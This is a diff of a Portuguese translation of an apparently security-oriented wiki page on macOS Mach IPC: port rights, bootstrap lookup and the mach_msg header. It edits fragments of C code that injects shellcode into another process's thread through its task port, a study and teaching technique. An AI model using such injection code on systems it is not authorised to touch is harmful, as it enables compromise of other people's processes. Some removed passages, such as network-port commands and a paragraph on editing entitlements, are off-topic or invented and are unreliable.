@@ -1,4 +1,4 @@
-# macOS IPC - Comunicação Interprocessos
+# macOS IPC - Comunicação entre Processos
 
 <details>
 
@@ -12,15 +12,19 @@
 
 </details>
 
-## Mensagens Mach via Portas
+## Mach messaging via Ports
 
-O Mach usa **tarefas** como a **unidade mínima** para compartilhar recursos, e cada tarefa pode conter **várias threads**. Essas **tarefas e threads são mapeadas em um para um com processos e threads POSIX**.
+### Informações básicas
 
-A comunicação entre tarefas ocorre por meio da Comunicação Interprocessos (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que funcionam como **filas de mensagens** gerenciadas pelo kernel.
+O Mach usa **tarefas** como a **unidade mínima** para compartilhar recursos, e cada tarefa pode conter **várias threads**. Essas **tarefas e threads são mapeadas em processos e threads POSIX na proporção de 1:1**.
 
-Cada processo possui uma **tabela IPC**, onde é possível encontrar as **portas Mach do processo**. O nome de uma porta Mach é na verdade um número (um ponteiro para o objeto do kernel).
+A comunicação entre tarefas ocorre por meio da Comunicação entre Processos (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que funcionam como **filas de mensagens** gerenciadas pelo kernel.
+
+Cada processo possui uma **tabela IPC**, onde é possível encontrar as **portas mach do processo**. O nome de uma porta mach é na verdade um número (um ponteiro para o objeto do kernel).
 
 Um processo também pode enviar um nome de porta com alguns direitos **para uma tarefa diferente** e o kernel fará com que essa entrada na **tabela IPC da outra tarefa** apareça.
+
+### Direitos de Porta
 
 Os direitos de porta, que definem quais operações uma tarefa pode executar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são:
 
@@ -29,10 +33,12 @@ Os direitos de porta, que definem quais operações uma tarefa pode executar, s�
 * **Direito de envio**, que permite enviar mensagens para a porta.
 * O direito de envio pode ser **clonado**, então uma tarefa que possui um direito de envio pode clonar o direito e **concedê-lo a uma terceira tarefa**.
 * **Direito de envio único**, que permite enviar uma mensagem para a porta e depois desaparece.
-* **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Conjuntos de portas podem ser usados para ouvir várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
+* **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Conjuntos de portas podem ser usados para ouvir várias portas simultaneamente, assim como `select`/`poll`/`epoll`/`kqueue` no Unix.
 * **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.
 
 **As tarefas podem transferir direitos de ENVIO para outras**, permitindo que elas enviem mensagens de volta. **Os direitos de ENVIO também podem ser clonados**, então uma tarefa pode duplicar e dar o direito a uma terceira tarefa. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação efetiva entre tarefas.
+
+### Estabelecendo uma comunicação
 
 #### Etapas:
 
@@ -41,10 +47,11 @@ Como mencionado, para estabelecer o canal de comunicação, o **servidor de inic
 1. A tarefa **A** inicia uma **nova porta**, obtendo um **direito de RECEBIMENTO** no processo.
 2. A tarefa **A**, sendo a detentora do direito de RECEBIMENTO, **gera um direito de ENVIO para a porta**.
 3. A tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, fornecendo o **nome do serviço da porta** e o **direito de ENVIO** por meio de um procedimento conhecido como registro de inicialização.
-4. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o serviço**. Se bem-sucedido, o **servidor duplica o direito de ENVIO** recebido da Tarefa A e o **transmite para a Tarefa B**.
+4. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o serviço**. Se for bem-sucedido, o **servidor duplica o direito de ENVIO** recebido da Tarefa A e o **transmite para a Tarefa B**.
 5. Ao adquirir um direito de ENVIO, a tarefa **B** é capaz de **formular** uma **mensagem** e enviá-la **para a Tarefa A**.
+6. Para uma comunicação bidirecional, geralmente a tarefa **B** gera uma nova porta com um direito de **RECEBIMENTO** e um direito de **ENVIO**, e dá o **direito de ENVIO à Tarefa A** para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).
 
-O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **se passar por qualquer tarefa do sistema**, como **reivindicar falsamente um nome de serviço de autorização** e, em seguida, aprovar todas as solicitações.
+O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **se passar por qualquer tarefa do sistema**, como reivindicar falsamente um nome de serviço de autorização e, em seguida, aprovar todas as solicitações.
 
 Em seguida, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios protegidos pelo SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Ao lado de cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **direito de RECEBIMENTO para cada um desses nomes de serviço**.
 
@@ -54,34 +61,42 @@ Para esses serviços predefinidos, o **processo de busca difere um pouco**. Quan
 * O **launchd** verifica se a tarefa está em execução e, se não estiver, a **inicia**.
 * A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização** cria um direito de ENVIO, o retém e **transfere o direito de RECEBIMENTO para a Tarefa A**.
 * O launchd duplica o **direito de ENVIO e o envia para a Tarefa B**.
+* A tarefa **B** gera uma nova porta com um direito de **RECEBIMENTO** e um direito de **ENVIO**, e dá o **direito de ENVIO à Tarefa A** (o svc) para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).
 
-No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não do sistema ainda operam como descrito originalmente, o que poderia potencialmente permitir a falsificação.
+No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não do sistema ainda operam conforme descrito originalmente, o que poderia permitir potencialmente a falsificação.
+### Uma Mensagem Mach
+
+As mensagens Mach são enviadas ou recebidas usando a função **`mach_msg`** (que é essencialmente uma syscall). Ao enviar, o primeiro argumento para essa chamada deve ser a **mensagem**, que deve começar com um **`mach_msg_header_t`** seguido da carga útil real:
+```c
+typedef struct {
+mach_msg_bits_t               msgh_bits;
+mach_msg_size_t               msgh_size;
+mach_port_t                   msgh_remote_port;
+mach_port_t                   msgh_local_port;
+mach_port_name_t              msgh_voucher_port;
+mach_msg_id_t                 msgh_id;
+} mach_msg_header_t;
+```
+O processo que pode **receber** mensagens em uma porta mach é dito possuir o _**direito de recebimento**_, enquanto os **remetentes** possuem um _**direito de envio**_ ou um _**direito de envio único**_. O direito de envio único, como o nome sugere, só pode ser usado para enviar uma única mensagem e depois é invalidado.
+
+Para alcançar uma **comunicação bidirecional** fácil, um processo pode especificar uma **porta mach** no **cabeçalho da mensagem mach** chamada de porta de resposta (**`msgh_local_port`**), onde o **destinatário** da mensagem pode **enviar uma resposta** a essa mensagem. Os bits de sinalizador em **`msgh_bits`** podem ser usados para **indicar** que um **direito de envio único** deve ser derivado e transferido para esta porta (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
+
+{% hint style="success" %}
+Observe que esse tipo de comunicação bidirecional é usado em mensagens XPC que esperam uma resposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Mas **geralmente são criadas portas diferentes** como explicado anteriormente para criar a comunicação bidirecional.
+{% endhint %}
+
+Os outros campos do cabeçalho da mensagem são:
+
+* `msgh_size`: o tamanho do pacote inteiro.
+* `msgh_remote_port`: a porta para a qual esta mensagem é enviada.
+* `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
+* `msgh_id`: o ID desta mensagem, que é interpretado pelo receptor.
+
+{% hint style="danger" %}
+Observe que as **mensagens mach são enviadas por uma **_**porta mach**_, que é um canal de comunicação **único receptor**, **múltiplos remetentes** incorporado no kernel mach. **Múltiplos processos** podem **enviar mensagens** para uma porta mach, mas em qualquer momento apenas **um único processo pode lê-la**.
+{% endhint %}
+
 ### Enumerar portas
-
-Para identificar quais portas estão abertas em um sistema macOS, você pode usar várias ferramentas e técnicas. Aqui estão algumas opções:
-
-- **Nmap**: O Nmap é uma ferramenta de código aberto amplamente utilizada para varredura de portas. Você pode executar o Nmap no macOS para identificar as portas abertas em um determinado host ou rede.
-
-   Exemplo de comando Nmap para varredura de portas:
-   ```
-   nmap <alvo>
-   ```
-
-- **Netstat**: O Netstat é uma ferramenta de linha de comando que exibe informações sobre as conexões de rede ativas e as portas abertas em um sistema. No macOS, você pode usar o comando `netstat -an` para listar todas as portas abertas.
-
-   Exemplo de comando Netstat para listar portas abertas:
-   ```
-   netstat -an | grep LISTEN
-   ```
-
-- **Lsof**: O Lsof é uma ferramenta de linha de comando que lista os arquivos abertos por processos em um sistema. No macOS, você pode usar o comando `lsof -i` para listar os processos que estão ouvindo em portas de rede.
-
-   Exemplo de comando Lsof para listar processos que estão ouvindo em portas de rede:
-   ```
-   lsof -i | grep LISTEN
-   ```
-
-Essas são apenas algumas das opções disponíveis para enumerar portas em um sistema macOS. É importante lembrar que a enumeração de portas em um sistema sem autorização prévia é considerada uma atividade ilegal e antiética. Portanto, sempre obtenha permissão adequada antes de realizar qualquer teste de segurança ou pentest.
 ```bash
 lsmp -p <pid>
 ```
@@ -175,17 +190,25 @@ int main(int argc, char** argv) {
     // Create a send right to the bootstrap port
     kr = bootstrap_look_up(bootstrap_port, "com.apple.securityd", &server_port);
     if (kr != KERN_SUCCESS) {
-        printf("Failed to look up the server port: %s\n", mach_error_string(kr));
+        printf("Failed to look up the securityd service: %s\n", mach_error_string(kr));
         return 1;
     }
 
-    // Send a message to the server
-    strcpy(buffer, "Hello, server!");
-    kr = mach_msg_send((mach_msg_header_t*)buffer);
+    // Send a message to the securityd service
+    strcpy(buffer, "Hello, securityd!");
+    kr = mach_msg((mach_msg_header_t*)&buffer,
+                  MACH_SEND_MSG,
+                  sizeof(buffer),
+                  0,
+                  MACH_PORT_NULL,
+                  MACH_MSG_TIMEOUT_NONE,
+                  MACH_PORT_NULL);
     if (kr != KERN_SUCCESS) {
-        printf("Failed to send message to server: %s\n", mach_error_string(kr));
+        printf("Failed to send message to securityd: %s\n", mach_error_string(kr));
         return 1;
     }
+
+    printf("Message sent successfully!\n");
 
     return 0;
 }
@@ -262,7 +285,7 @@ printf("Sent a message\n");
 
 ### Injeção de Shellcode em thread via Porta da Tarefa
 
-Você pode obter um shellcode em:
+Você pode obter um shellcode de:
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -300,16 +323,6 @@ return 0;
 }
 ```
 {% tab title="entitlements.plist" %}
-
-O arquivo `entitlements.plist` contém informações sobre as permissões e privilégios concedidos a um aplicativo no macOS. Essas permissões podem incluir acesso a recursos do sistema, como câmera, microfone, localização e muito mais. O arquivo `entitlements.plist` é usado para definir as capacidades e restrições de um aplicativo, garantindo que ele tenha acesso apenas aos recursos necessários e autorizados.
-
-Ao modificar o arquivo `entitlements.plist`, é possível alterar as permissões concedidas a um aplicativo. Isso pode ser útil em cenários de teste de penetração, onde se deseja explorar vulnerabilidades de privilégio ou realizar escalonamento de privilégios. No entanto, é importante ressaltar que a modificação indevida do arquivo `entitlements.plist` pode violar as políticas de segurança e privacidade do macOS.
-
-Para modificar o arquivo `entitlements.plist`, é necessário ter acesso de gravação ao aplicativo em questão. Isso pode ser feito usando técnicas de hacking, como injeção de código, exploração de vulnerabilidades ou engenharia reversa. Uma vez que o acesso de gravação é obtido, o arquivo `entitlements.plist` pode ser editado para adicionar, remover ou modificar as permissões concedidas ao aplicativo.
-
-É importante lembrar que a modificação do arquivo `entitlements.plist` pode ter consequências significativas para a segurança e o funcionamento do aplicativo. Portanto, é recomendável realizar essas alterações apenas em um ambiente controlado e para fins legítimos, como testes de segurança ou desenvolvimento de software.
-
-{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -738,7 +751,7 @@ kr = mach_vm_write(remoteTask,                   // Porta da tarefa
 
 if (kr != KERN_SUCCESS)
 {
-    fprintf(stderr, "Não foi possível escrever na memória da thread remota: Erro %s\n", mach_error_string(kr));
+    fprintf(stderr, "Não foi possível escrever na memória do thread remoto: Erro %s\n", mach_error_string(kr));
     return (-3);
 }
 
@@ -748,7 +761,7 @@ kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EX
 
 if (kr != KERN_SUCCESS)
 {
-    fprintf(stderr, "Não foi possível definir as permissões de memória para o código da thread remota: Erro %s\n", mach_error_string(kr));
+    fprintf(stderr, "Não foi possível definir as permissões de memória para o código do thread remoto: Erro %s\n", mach_error_string(kr));
     return (-4);
 }
 
@@ -757,12 +770,12 @@ kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_P
 
 if (kr != KERN_SUCCESS)
 {
-    fprintf(stderr, "Não foi possível definir as permissões de memória para a pilha da thread remota: Erro %s\n", mach_error_string(kr));
+    fprintf(stderr, "Não foi possível definir as permissões de memória para a pilha do thread remoto: Erro %s\n", mach_error_string(kr));
     return (-4);
 }
 
 
-// Crie uma thread para executar o shellcode
+// Crie um thread para executar o shellcode
 struct arm_unified_thread_state remoteThreadState64;
 thread_act_t remoteThread;
 
@@ -778,14 +791,14 @@ remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
 remoteThreadState64.ts_64.__pc = (u_int64_t)remoteCode64;
 remoteThreadState64.ts_64.__sp = (u_int64_t)remoteStack64;
 
-printf("Pilha Remota 64  0x%llx, Código Remoto é %p\n", remoteStack64, p);
+printf("Pilha remota 64  0x%llx, Código remoto é %p\n", remoteStack64, p);
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
                            (thread_state_t)&remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
 
 if (kr != KERN_SUCCESS)
 {
-    fprintf(stderr, "Não foi possível criar a thread remota: erro %s", mach_error_string(kr));
+    fprintf(stderr, "Não foi possível criar o thread remoto: erro %s", mach_error_string(kr));
     return (-3);
 }
 
@@ -857,6 +870,8 @@ Para mais informações, consulte:
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
 * [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
 <details>
 
